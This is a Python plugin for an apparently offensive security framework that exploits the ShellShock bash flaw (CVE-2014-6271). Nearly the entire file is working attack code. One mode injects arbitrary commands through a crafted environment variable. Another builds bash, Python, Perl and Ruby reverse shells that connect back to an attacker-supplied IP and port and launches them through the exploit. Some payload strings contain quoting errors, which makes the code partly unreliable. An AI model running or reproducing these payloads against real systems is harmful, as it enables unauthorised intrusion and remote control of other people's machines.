
"""execution/shellshock — ShellShock (CVE-2014-6271) exploitation module."""
import subprocess
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class ShellShock(BasePlugin):
    """
    CVE-2014-6271 (ShellShock) and advanced shell exploitation:
    - Detect vulnerable bash versions
    - Exploit ShellShock
    - Create reverse shell
    - Environment variable injection
    """
    NAME        = "shellshock"
    DESCRIPTION = "Detect/exploit CVE-2014-6271, create reverse shells via ShellShock or direct shell."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1190"
    CATEGORY    = "execution"
    schema      = ParamSchema().add(
        Param("mode",       str, required=True,  default="detect",
              help="Mode: detect | exploit | reverse_shell",
              validator=lambda v: v in ("detect", "exploit", "reverse_shell")),
        Param("command",    str, required=False, default="id",
              help="Command to execute (exploit/reverse_shell modes)"),
        Param("target",     str, required=False, default="",
              help="Target IP for reverse_shell"),
        Param("port",       int, required=False, default=4444,
              help="Target port for reverse_shell"),
        Param("shell_type", str, required=False, default="bash",
              help="Reverse shell type: bash | python | perl | ruby",
              validator=lambda v: v in ("bash", "python", "perl", "ruby")),
    )

    @mitre("T1190")
    def run(self, session, params, ctx=None):
        mode = params["mode"]

        if mode == "detect":
            return self.detect_vulnerable_bash()
        elif mode == "exploit":
            cmd = params.get("command", "id")
            return self.exploit_shellshock(cmd)
        elif mode == "reverse_shell":
            target = params.get("target", "")
            if not target:
                return ModuleResult.err("Target IP required for reverse_shell mode")
            port = params.get("port", 4444)
            return self.reverse_shell(target, port, params.get("shell_type", "bash"))
        return ModuleResult.err("Invalid mode")

    @staticmethod
    def detect_vulnerable_bash():
        """Check bash version and vulnerability to ShellShock (CVE-2014-6271)."""
        try:
            # Test for ShellShock
            test_cmd = "env x='() { :;}; echo vulnerable' bash -c 'echo safe"
            proc = subprocess.run(
                test_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            if "vulnerable" in proc.stdout:
                return ModuleResult.ok(data={
                    "vulnerable": True,
                    "stdout": proc.stdout,
                    "stderr": proc.stderr
                })
            return ModuleResult.ok(data={"vulnerable": False})
        except Exception as e:
            return ModuleResult.err(str(e))

    @staticmethod
    def exploit_shellshock(cmd, ctx=None):
        """Exploit string: () { :;}; /bin/bash -c 'command'."""
        exploit_cmd = f"env x='() {{ :;}}; {cmd}' bash -c 'echo done'"
        try:
            proc = subprocess.run(
                exploit_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            return ModuleResult.ok(data={
                "stdout": proc.stdout,
                "stderr": proc.stderr
            })
        except Exception as e:
            return ModuleResult.err(str(e))

    @staticmethod
    def reverse_shell(target, port, shell_type="bash"):
        """
        Bash reverse shell, Python reverse shell, Ruby reverse shell, Perl reverse shell.
        """
        shells = {
            "bash": f"bash -i >& /dev/tcp/{target}/{port} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{target}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
            "perl": f"perl -e 'use Socket;$i=\"{target}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{target}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&3 >&3 2>&3\")'"
        }
        payload = shells.get(shell_type, shells["bash"])
        exploit = f"env x='() {{ :;}}; {payload}' bash -c 'echo connecting'"
        try:
            proc = subprocess.Popen(
                exploit,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            return ModuleResult.ok(data={
                "status": "reverse shell spawned",
                "payload": payload
            })
        except Exception as e:
            return ModuleResult.err(str(e))
